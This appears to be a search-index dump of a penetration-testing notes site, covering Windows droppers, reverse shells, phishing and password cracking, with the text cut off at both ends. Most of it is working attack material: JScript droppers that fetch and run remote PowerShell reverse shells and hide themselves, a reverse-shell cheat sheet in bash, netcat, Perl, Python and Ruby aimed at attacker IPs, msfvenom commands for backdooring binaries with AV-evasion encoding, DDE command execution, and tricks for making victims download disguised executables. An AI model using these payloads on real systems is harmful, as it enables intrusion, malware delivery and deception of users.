https://blog.netspi.com/getting-started-wmi-weaponization-part-5/","title":"WMI"},{"location":"initial_access/initial_access_dropper/","text":"A dropper never contains the actual payload. It is only the first stage which downloads the actual payload. For windows it can take many different forms, or written in different languages etc. Here are a few. No. Dropper type File extension 1 JScript .js/.jse 2 VBScript .vbs/.vbe 3 Windows Script File .wsf 4 HTML Application .hta 5 Compiled HTML Help .chm 6 Batch file .bat 7 Shortcut .lnk 8 Office Word/Excel .doc/.docm/.xls/... 9 Registry file .reg 10 Executable .exe 11 Screensaver file .scr 12 Program Information File .pif 13 Installer Package .msi 14 Java Archive .jar 15 Troubleshooting pack cabinet .diagcab What we want to do here is really easy. We want to download the payload and then execute it. That is all. However, we have a few requirements. 1. It needs to communicate over HTTPS. 2. It should not write anything to disk (except for the dropper of course). 3. It should download a fake document, and open it. Executing in memory (Fileless) # So before we go in to start developing our dropper in different languages we need to look at the different ways to execute code in memory. Powershell / WMI / ADODB.Stream # This is probably the most common way. There are a few flags that can be used to make the powershell command a bit more stealthy. https://securityaffairs.co/wordpress/65570/hacking/powershell-attacks.html https://www.reddit.com/r/PowerShell/comments/8qsndn/sneaky_powershell_trick_run_completely_without_a/ With Powershell there are mainly three ways to download files. Invoke webrequest # Invoke-WebRequest $url = \"http://mirror.internode.on.net/pub/test/10meg.test\" $output = \"$PSScriptRoot\\10meg.test\" $start_time = Get-Date Invoke-WebRequest -Uri $url -OutFile $output Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)\" System.Net.WebClient # This is a .Net class that you can use straight from powershell. (New-Object System.Net.WebClient).DownloadFile($url, $output) Start-BitsTransfer # start-bitstransfer -source http://192.168.66.87/apaa.txt -destination test2.txt Copy-item (SMB) # Copy-Item -Source \\\\server\\share\\file -Destination C:\\path\\ JScript / JS # JScript and VBScript are supported nativly in Windows. When clicked on they are executed by wscript.exe . When a .js file is clicked on in a windows machine that script is executed by wscript.exe. Using a .js file might be beneficial because its icon looks like a text-document. This is an example of a dropper that will do the following: 1. Download a clean PDF document. 2. Open the document 3. Remove itself 4. Download an run the actual payload // Name of file: Interestingfile.js // Download clean-document command = \"powershell.exe -exec bypass -Windowstyle Hidden -command \\\"start-bitstransfer -source http://192.168.66.87/Interestingfile.pdf -destination Interestingfile.pdf\\\"\"; shell = new ActiveXObject(\"WScript.Shell\").Run(command,0,true); // Sleep a bit to make sure the document is downloaded WScript.Sleep(3000); // Open the document var shell = WScript.CreateObject(\"WScript.Shell\"); shell.Run(\"Interestingfile.pdf\"); // Remove the dropper-file command = \"powershell.exe -exec bypass -Windowstyle Hidden -command \\\"rm Interestingfile.js\\\"\"; shell = new ActiveXObject(\"WScript.Shell\").Run(command,0,true); // Launche the reverse shell command = \"powershell.exe -exec bypass -Windowstyle Hidden -noexit -command \\\"iex (New-Object Net.WebClient).DownloadString('http://192.168.66.87/shell_reverse.ps1')\\\"\"; shell = new ActiveXObject(\"WScript.Shell\").Run(command,0,true); Not so fileless. This is another fun technique, however it writes to disk, so make sure that your malivious code is not of-the-shelf or it will be spotted by anti-virus. var myActXobj = this[\"ActiveXObject\"]; var myShell = new myActXobj(\"WScript.Shell\"); var myHTTP = new myActXobj(\"MSXML2.XMLHTTP\"); var myTempPath = myShell[\"ExpandEnvironmentStrings\"](\"%TEMP%\"); function dropperFunc(myURL, exeName) { var myPath = myTempPath + \"/\" + exeName + \".exe\"; myHTTP[\"open\"](\"GET\", myURL, false); myHTTP[\"send\"](); if (myHTTP.status == 200) { var myStream = new myActXobj(\"ADODB.Stream\"); myStream[\"open\"](); myStream.type = 1; myStream[\"write\"](myHTTP[\"ResponseBody\"]); myStream[\"position\"] = 0; myStream[\"saveToFile\"](myPath, 2); myStream.close(); myShell[\"Run\"](myPath, 1, 0); } } dropperFunc(\"hxxx://mittmalware[.]com/mal.bin\",\"CGvMIoL\"); HTA # A .hta-file is basically just an HTML file. But when it is executed the javascript inside it has access to ActiveXObjects so it can execute anything on the machien. .HTA files are more prone to be considered malware though. <html> <head> <script language=\"VBscript\"> But your VBScript or JScript here </script> </head> </html> Registry file # Insert malicious file (OLE Object) into Word # OLE stands for Object Linking and Embedding. You can embed different types of files into a Word file. Common OLE objects are JavaScript, VBScript or EXE files. Open up a word document. Go to Insert > Text > Object > Create New > Package > Browse to your malicious javascript-file . The user must click on the file for it to be executed. For this there are a few different techniques in use. It might be to make the icon huge, and then ask the user to click it to decrypt the text ot something like that. It can also be to ask the user to click on the file to prove you are not a robot. Dynamic Data Exchange - DDE # Using DDE it is possible to execute commands from within Word or Excel. Microsoft patched the possiblility to execute DDE:s from word. In latest Microsoft Excel 365 (2019) you need to go to File / Options / Trust Center / Trust Center Settings / Enable Dynamic Data Exchange Server Launch for it to work. You can execute commands like this: =cmd| '/c cmd.exe'!A1 If you want to run more complicated commands that require multiple quotationmarks you can encode your payload with base64. It appreas that it needs to be [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-ChildItem')) Download and execute your second stage payload # So, if you get your user to execute a .js file, DDE, EXE or any other type, you want to download your real code. There are some things you want with this. You do not want to write your second stage payload to disk, as that increase the risk of it being detected by anti-virus. So you want to run your code straight into memory if you can. https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/","title":"Initial Dropper"},{"location":"initial_access/initial_access_dropper/#executing-in-memory-fileless","text":"So before we go in to start developing our dropper in different languages we need to look at the different ways to execute code in memory.","title":"Executing in memory (Fileless)"},{"location":"initial_access/initial_access_dropper/#powershell-wmi-adodbstream","text":"This is probably the most common way. There are a few flags that can be used to make the powershell command a bit more stealthy. https://securityaffairs.co/wordpress/65570/hacking/powershell-attacks.html https://www.reddit.com/r/PowerShell/comments/8qsndn/sneaky_powershell_trick_run_completely_without_a/ With Powershell there are mainly three ways to download files.","title":"Powershell / WMI / ADODB.Stream"},{"location":"initial_access/initial_access_dropper/#invoke-webrequest","text":"Invoke-WebRequest $url = \"http://mirror.internode.on.net/pub/test/10meg.test\" $output = \"$PSScriptRoot\\10meg.test\" $start_time = Get-Date Invoke-WebRequest -Uri $url -OutFile $output Write-Output \"Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)\"","title":"Invoke webrequest"},{"location":"initial_access/initial_access_dropper/#systemnetwebclient","text":"This is a .Net class that you can use straight from powershell. (New-Object System.Net.WebClient).DownloadFile($url, $output)","title":"System.Net.WebClient"},{"location":"initial_access/initial_access_dropper/#start-bitstransfer","text":"start-bitstransfer -source http://192.168.66.87/apaa.txt -destination test2.txt","title":"Start-BitsTransfer"},{"location":"initial_access/initial_access_dropper/#copy-item-smb","text":"Copy-Item -Source \\\\server\\share\\file -Destination C:\\path\\","title":"Copy-item (SMB)"},{"location":"initial_access/initial_access_dropper/#jscript-js","text":"JScript and VBScript are supported nativly in Windows. When clicked on they are executed by wscript.exe . When a .js file is clicked on in a windows machine that script is executed by wscript.exe. Using a .js file might be beneficial because its icon looks like a text-document. This is an example of a dropper that will do the following: 1. Download a clean PDF document. 2. Open the document 3. Remove itself 4. Download an run the actual payload // Name of file: Interestingfile.js // Download clean-document command = \"powershell.exe -exec bypass -Windowstyle Hidden -command \\\"start-bitstransfer -source http://192.168.66.87/Interestingfile.pdf -destination Interestingfile.pdf\\\"\"; shell = new ActiveXObject(\"WScript.Shell\").Run(command,0,true); // Sleep a bit to make sure the document is downloaded WScript.Sleep(3000); // Open the document var shell = WScript.CreateObject(\"WScript.Shell\"); shell.Run(\"Interestingfile.pdf\"); // Remove the dropper-file command = \"powershell.exe -exec bypass -Windowstyle Hidden -command \\\"rm Interestingfile.js\\\"\"; shell = new ActiveXObject(\"WScript.Shell\").Run(command,0,true); // Launche the reverse shell command = \"powershell.exe -exec bypass -Windowstyle Hidden -noexit -command \\\"iex (New-Object Net.WebClient).DownloadString('http://192.168.66.87/shell_reverse.ps1')\\\"\"; shell = new ActiveXObject(\"WScript.Shell\").Run(command,0,true); Not so fileless. This is another fun technique, however it writes to disk, so make sure that your malivious code is not of-the-shelf or it will be spotted by anti-virus. var myActXobj = this[\"ActiveXObject\"]; var myShell = new myActXobj(\"WScript.Shell\"); var myHTTP = new myActXobj(\"MSXML2.XMLHTTP\"); var myTempPath = myShell[\"ExpandEnvironmentStrings\"](\"%TEMP%\"); function dropperFunc(myURL, exeName) { var myPath = myTempPath + \"/\" + exeName + \".exe\"; myHTTP[\"open\"](\"GET\", myURL, false); myHTTP[\"send\"](); if (myHTTP.status == 200) { var myStream = new myActXobj(\"ADODB.Stream\"); myStream[\"open\"](); myStream.type = 1; myStream[\"write\"](myHTTP[\"ResponseBody\"]); myStream[\"position\"] = 0; myStream[\"saveToFile\"](myPath, 2); myStream.close(); myShell[\"Run\"](myPath, 1, 0); } } dropperFunc(\"hxxx://mittmalware[.]com/mal.bin\",\"CGvMIoL\");","title":"JScript / JS"},{"location":"initial_access/initial_access_dropper/#hta","text":"A .hta-file is basically just an HTML file. But when it is executed the javascript inside it has access to ActiveXObjects so it can execute anything on the machien. .HTA files are more prone to be considered malware though. <html> <head> <script language=\"VBscript\"> But your VBScript or JScript here </script> </head> </html>","title":"HTA"},{"location":"initial_access/initial_access_dropper/#registry-file","text":"","title":"Registry file"},{"location":"initial_access/initial_access_dropper/#insert-malicious-file-ole-object-into-word","text":"OLE stands for Object Linking and Embedding. You can embed different types of files into a Word file. Common OLE objects are JavaScript, VBScript or EXE files. Open up a word document. Go to Insert > Text > Object > Create New > Package > Browse to your malicious javascript-file . The user must click on the file for it to be executed. For this there are a few different techniques in use. It might be to make the icon huge, and then ask the user to click it to decrypt the text ot something like that. It can also be to ask the user to click on the file to prove you are not a robot.","title":"Insert malicious file (OLE Object) into Word"},{"location":"initial_access/initial_access_dropper/#dynamic-data-exchange-dde","text":"Using DDE it is possible to execute commands from within Word or Excel. Microsoft patched the possiblility to execute DDE:s from word. In latest Microsoft Excel 365 (2019) you need to go to File / Options / Trust Center / Trust Center Settings / Enable Dynamic Data Exchange Server Launch for it to work. You can execute commands like this: =cmd| '/c cmd.exe'!A1 If you want to run more complicated commands that require multiple quotationmarks you can encode your payload with base64. It appreas that it needs to be [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-ChildItem'))","title":"Dynamic Data Exchange - DDE"},{"location":"initial_access/initial_access_dropper/#download-and-execute-your-second-stage-payload","text":"So, if you get your user to execute a .js file, DDE, EXE or any other type, you want to download your real code. There are some things you want with this. You do not want to write your second stage payload to disk, as that increase the risk of it being detected by anti-virus. So you want to run your code straight into memory if you can. https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/","title":"Download and execute your second stage payload"},{"location":"initial_access/phishing_server/","text":"# A how-to and a script can be found on my github: https://github.com/gandhi-taha/phishingserver. Just follow those instructions and you will be able to set up a phishing-email-server pretty easy.","title":"Setting Up Email-phishing-server"},{"location":"initial_access/reverse_shell/","text":"Reverse-shells # This is s great collection of different types of reverse shells and webshells. Many of the ones listed below comes from this cheat-sheet: https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet Msfvenom # There is an important difference between non-staged and staged payload. A non-staged shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat. staged shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide up the payload. Meterpreter is a staged shell. First it sends some parts of it and sets up the connection, and then it sends some more. This can be caught with metasploit multi-handler but not with netcat. Windows # Meterpreter # Standard meterpreter msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe use exploit/multi/handler set payload windows/meterpreter/reverse_tcp Meterpreter HTTPS It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections. msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f exe -o met_https_reverse.exe Non-staged payload # msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe use exploit/multi/handler set payload windows/shell_reverse_tcp Staged payload # msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe This must be caught with metasploit. It does not work with netcat. use exploit/multi/handler set payload windows/shell/reverse_tcp Inject payload into binary # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x \"/somebinary.exe\" -o bad_binary.exe Linux # Binary # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf Bash # 0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 Php # php -r '$sock=fsockopen(\"ATTACKING-IP\",80);exec(\"/bin/sh -i <&3 >&3 2>&3\");' Netcat # Bind shell #Linux nc -vlp 5555 -e /bin/bash nc 192.168.1.101 5555 # Windows nc.exe -nlvp 4444 -e cmd.exe Reverse shell # Linux nc -lvp 5555 nc 192.168.1.101 5555 -e /bin/bash # Windows nc -lvp 443 nc.exe 192.168.1.101 443 -e cmd.exe With -e flag nc -e /bin/sh ATTACKING-IP 80 /bin/sh | nc ATTACKING-IP 80 Without -e flag rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ Socat # Listener (Server) socat file:`tty`,raw,echo=0 tcp-listen:4444 Callback (Victim/Client) socat tcp-connect:10.10.10.10:4444 exec:sh,pty,stderr,setsid,sigint,sane Ncat # Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted. Bind ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl ncat -v 192.168.1.103 5555 --ssl Telnet # rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443 Perl # perl -e 'use Socket;$i=\"ATTACKING-IP\";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' Ruby # ruby -rsocket -e'f=TCPSocket.open(\"ATTACKING-IP\",80).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' Java # r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]) p.waitFor() Python # python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKING-IP\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Web-shells - Platform Independent # PHP # This php-shell is OS-independent. You can use it on both Linux and Windows. msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php ASP # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp WAR # msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war JSP # msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp","title":"Generate Payload - Reverse shells"},{"location":"initial_access/reverse_shell/#reverse-shells","text":"This is s great collection of different types of reverse shells and webshells. Many of the ones listed below comes from this cheat-sheet: https://highon.coffee/blog/reverse-shell-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet","title":"Reverse-shells"},{"location":"initial_access/reverse_shell/#msfvenom","text":"There is an important difference between non-staged and staged payload. A non-staged shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat. staged shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide up the payload. Meterpreter is a staged shell. First it sends some parts of it and sets up the connection, and then it sends some more. This can be caught with metasploit multi-handler but not with netcat.","title":"Msfvenom"},{"location":"initial_access/reverse_shell/#windows","text":"","title":"Windows"},{"location":"initial_access/reverse_shell/#meterpreter","text":"Standard meterpreter msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe use exploit/multi/handler set payload windows/meterpreter/reverse_tcp Meterpreter HTTPS It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections. msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f exe -o met_https_reverse.exe","title":"Meterpreter"},{"location":"initial_access/reverse_shell/#non-staged-payload","text":"msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe use exploit/multi/handler set payload windows/shell_reverse_tcp","title":"Non-staged payload"},{"location":"initial_access/reverse_shell/#staged-payload","text":"msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe This must be caught with metasploit. It does not work with netcat. use exploit/multi/handler set payload windows/shell/reverse_tcp","title":"Staged payload"},{"location":"initial_access/reverse_shell/#inject-payload-into-binary","text":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x \"/somebinary.exe\" -o bad_binary.exe","title":"Inject payload into binary"},{"location":"initial_access/reverse_shell/#linux","text":"","title":"Linux"},{"location":"initial_access/reverse_shell/#binary","text":"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf","title":"Binary"},{"location":"initial_access/reverse_shell/#bash","text":"0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1","title":"Bash"},{"location":"initial_access/reverse_shell/#php","text":"php -r '$sock=fsockopen(\"ATTACKING-IP\",80);exec(\"/bin/sh -i <&3 >&3 2>&3\");'","title":"Php"},{"location":"initial_access/reverse_shell/#netcat","text":"Bind shell #Linux nc -vlp 5555 -e /bin/bash nc 192.168.1.101 5555 # Windows nc.exe -nlvp 4444 -e cmd.exe Reverse shell # Linux nc -lvp 5555 nc 192.168.1.101 5555 -e /bin/bash # Windows nc -lvp 443 nc.exe 192.168.1.101 443 -e cmd.exe With -e flag nc -e /bin/sh ATTACKING-IP 80 /bin/sh | nc ATTACKING-IP 80 Without -e flag rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/","title":"Netcat"},{"location":"initial_access/reverse_shell/#socat","text":"Listener (Server) socat file:`tty`,raw,echo=0 tcp-listen:4444 Callback (Victim/Client) socat tcp-connect:10.10.10.10:4444 exec:sh,pty,stderr,setsid,sigint,sane","title":"Socat"},{"location":"initial_access/reverse_shell/#ncat","text":"Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted. Bind ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl ncat -v 192.168.1.103 5555 --ssl","title":"Ncat"},{"location":"initial_access/reverse_shell/#telnet","text":"rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443","title":"Telnet"},{"location":"initial_access/reverse_shell/#perl","text":"perl -e 'use Socket;$i=\"ATTACKING-IP\";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'","title":"Perl"},{"location":"initial_access/reverse_shell/#ruby","text":"ruby -rsocket -e'f=TCPSocket.open(\"ATTACKING-IP\",80).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'","title":"Ruby"},{"location":"initial_access/reverse_shell/#java","text":"r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]) p.waitFor()","title":"Java"},{"location":"initial_access/reverse_shell/#python","text":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKING-IP\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'","title":"Python"},{"location":"initial_access/reverse_shell/#web-shells-platform-independent","text":"","title":"Web-shells - Platform Independent"},{"location":"initial_access/reverse_shell/#php_1","text":"This php-shell is OS-independent. You can use it on both Linux and Windows. msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php","title":"PHP"},{"location":"initial_access/reverse_shell/#asp","text":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp","title":"ASP"},{"location":"initial_access/reverse_shell/#war","text":"msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war","title":"WAR"},{"location":"initial_access/reverse_shell/#jsp","text":"msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp","title":"JSP"},{"location":"initial_access/social_engineering_-_phishing/","text":"Social Engineering - Phishing # Gaining initial access to a network is often done using different kinds of social engineering attacks. Auto-download a malicious file # The techical part is not really that difficult here. In order to auto-download a file you just add this script to the malicious webpage <script> document.location.href = 'shell53.exe'; </script> Another way to do it is like this <html> <head> <meta http-equiv=\"refresh\" content=\"0; url=shell53.exe\"> </head> </html> Of course the user will have to accept to download the file, unless the user has previously checked in the box automatically download. The user must then click the file for it to execute. This is where the social engineering part comes in, you really must trick the user into executing the file. Change the filename # Since windows by default remove the filename you can call your file shell.jpg.exe, and once downloaded onto the machine windows will display it as \"shell.jpg\". Embed malicious code in legitimate file # It is however very likely that this will be picked up by a antivirus. msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lhost=53 -e x86/shikata_ga_nai -i 3 -b \"\\x00\" -f exe -o ncMalicious.exe Autodownload a malicious javascript-file # Just like we can download an exe for a user to can also make that user download a javascript file. Since javascript files can execute commands on windows. var oShell = new ActiveXObject(\"Shell.Application\"); var commandtoRun = \"C:\\\\Windows\\\\system32\\\\calc.exe\"; oShell.ShellExecute(commandtoRun,\"\",\"\",\"open\",\"1\"); http://evilsite.com/file.js This code can be modified to greate a wget-script and then download and execute a script. Phishing # The most common tool for social engineering is to use Social Engineering Toolkit. SET. It comes as default in Kali. Run it like this: setoolkit Word/excel makros # An explanation of how to createa malicious makro-wordfile. https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/ Reference: # https://www.youtube.com/watch?v=NTdthBQYa1k","title":"Social Engineering and Phishing"},{"location":"initial_access/social_engineering_-_phishing/#social-engineering-phishing","text":"Gaining initial access to a network is often done using different kinds of social engineering attacks.","title":"Social Engineering - Phishing"},{"location":"initial_access/social_engineering_-_phishing/#auto-download-a-malicious-file","text":"The techical part is not really that difficult here. In order to auto-download a file you just add this script to the malicious webpage <script> document.location.href = 'shell53.exe'; </script> Another way to do it is like this <html> <head> <meta http-equiv=\"refresh\" content=\"0; url=shell53.exe\"> </head> </html> Of course the user will have to accept to download the file, unless the user has previously checked in the box automatically download. The user must then click the file for it to execute. This is where the social engineering part comes in, you really must trick the user into executing the file.","title":"Auto-download a malicious file"},{"location":"initial_access/social_engineering_-_phishing/#change-the-filename","text":"Since windows by default remove the filename you can call your file shell.jpg.exe, and once downloaded onto the machine windows will display it as \"shell.jpg\".","title":"Change the filename"},{"location":"initial_access/social_engineering_-_phishing/#embed-malicious-code-in-legitimate-file","text":"It is however very likely that this will be picked up by a antivirus. msfvenom -a x86 --platform windows -x nc.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lhost=53 -e x86/shikata_ga_nai -i 3 -b \"\\x00\" -f exe -o ncMalicious.exe","title":"Embed malicious code in legitimate file"},{"location":"initial_access/social_engineering_-_phishing/#autodownload-a-malicious-javascript-file","text":"Just like we can download an exe for a user to can also make that user download a javascript file. Since javascript files can execute commands on windows. var oShell = new ActiveXObject(\"Shell.Application\"); var commandtoRun = \"C:\\\\Windows\\\\system32\\\\calc.exe\"; oShell.ShellExecute(commandtoRun,\"\",\"\",\"open\",\"1\"); http://evilsite.com/file.js This code can be modified to greate a wget-script and then download and execute a script.","title":"Autodownload a malicious javascript-file"},{"location":"initial_access/social_engineering_-_phishing/#phishing","text":"The most common tool for social engineering is to use Social Engineering Toolkit. SET. It comes as default in Kali. Run it like this: setoolkit","title":"Phishing"},{"location":"initial_access/social_engineering_-_phishing/#wordexcel-makros","text":"An explanation of how to createa malicious makro-wordfile. https://www.offensive-security.com/metasploit-unleashed/vbscript-infection-methods/","title":"Word/excel makros"},{"location":"initial_access/social_engineering_-_phishing/#reference","text":"https://www.youtube.com/watch?v=NTdthBQYa1k","title":"Reference:"},{"location":"password_cracking/generate_custom_wordlist/","text":"Generate custom wordlist # Cracking passwords is good to know. If we are able to do a dictionary-attack against a service it is important that we use a good dictionary. We can use e generic one. But we can also generate a custom wordlist based on certain criteria. That is what we are going to do in this chapter. Remember people often use their birth dates, address, street address, pets, family members, etc. Who is the target? # The target might be a specific company or person. Password rules # The service you want to hack might have specific password rules. Must contain certain characters, must be of certain length etc. Combine a small/semi-small dict with a custom # To combine two wordlists you can just do cat wordlist.txt >> wordlist2.txt Create a custom wordlist # Html2dic - Build dictionary from html You can build a dictionary from a html-page. curl http://example.com > example.txt Then run: html2dic example.txt Then you should probably remove duplicates. Cewl - Spider and build dictionary cewl -w createWordlist.txt https://www.example.com Add minimum password length: cewl -w createWordlist.txt -m 6 https://www.example.com Improve the custom wordlist As we all know few password are just simple words. Many use numbers and special characters. To improve our password list we can use john the ripper. We can input our own rules, or we can just use the standard john-the-ripper rules john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt References # http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/","title":"Generate Custom Password List"},{"location":"password_cracking/generate_custom_wordlist/#generate-custom-wordlist","text":"Cracking passwords is good to know. If we are able to do a dictionary-attack against a service it is important that we use a good dictionary. We can use e generic one. But we can also generate a custom wordlist based on certain criteria. That is what we are going to do in this chapter. Remember people often use their birth dates, address, street address, pets, family members, etc.","title":"Generate custom wordlist"},{"location":"password_cracking/generate_custom_wordlist/#who-is-the-target","text":"The target might be a specific company or person.","title":"Who is the target?"},{"location":"password_cracking/generate_custom_wordlist/#password-rules","text":"The service you want to hack might have specific password rules. Must contain certain characters, must be of certain length etc.","title":"Password rules"},{"location":"password_cracking/generate_custom_wordlist/#combine-a-smallsemi-small-dict-with-a-custom","text":"To combine two wordlists you can just do cat wordlist.txt >> wordlist2.txt","title":"Combine a small/semi-small dict with a custom"},{"location":"password_cracking/generate_custom_wordlist/#create-a-custom-wordlist","text":"Html2dic - Build dictionary from html You can build a dictionary from a html-page. curl http://example.com > example.txt Then run: html2dic example.txt Then you should probably remove duplicates. Cewl - Spider and build dictionary cewl -w createWordlist.txt https://www.example.com Add minimum password length: cewl -w createWordlist.txt -m 6 https://www.example.com Improve the custom wordlist As we all know few password are just simple words. Many use numbers and special characters. To improve our password list we can use john the ripper. We can input our own rules, or we can just use the standard john-the-ripper rules john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt","title":"Create a custom wordlist"},{"location":"password_cracking/generate_custom_wordlist/#references","text":"http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/","title":"References"},{"location":"password_cracking/generate_password_list/","text":"No matter if you do an internal, external, AD or even web application test you might need to generate password lists in order to try some brute forcing. Create wordlist from website # This can be done with wordlist-extractor in burp. Create wordlist from Active Directory #","title":"Generate Password List"},{"location":"password_cracking/generate_password_list/#create-wordlist-from-website","text":"This can be done with wordlist-extractor in burp.","title":"Create wordlist from website"},{"location":"password_cracking/generate_password_list/#create-wordlist-from-active-directory","text":"","title":"Create wordlist from Active Directory"},{"location":"password_cracking/offline_password_cracking/","text":"Offline password cracking # We might find passwords or other credentials in databases. These are often hashed, so we need to first identify which hash it is and then try to crack it. The first step is to identify the hash-algorithm that was used to hash the password. Identify hash # There are generally speaking three pieces of data we can use to identify a hash. - The length of the hash - The character set - Any special characters In order to identify a hash we can either use specialized tools that analyze the hash and then return a guess on which algorithm it is. An easier way is of course to just look in the documentation of the software where you found the hashes. It usually says in the documentation or the source code which type of hash is being used. In kali we can use hash-identifier or hashid : hash-identifier hashid Or try these online services: http://www.onlinehashcrack.com/hash-identification.php https://md5hashing.net/hash_type_checker Windows domain - Checking password complexity # Find out the password complexity in windows. net accounts /domain net accounts Cracking the hash # Okay so now we know what hash it is, let's get cracking. If you want to try out the functionality of hashcat or john the ripper you can find example hashes here: http://openwall.info/wiki/john/sample-hashes. Hashcat # Look for the specific type of hash you want to crack in the list produced by the following command: hashcat --help My hash was a Apache md5, so I will use the corresponding code for it, 1600 -a 0 - straight -o 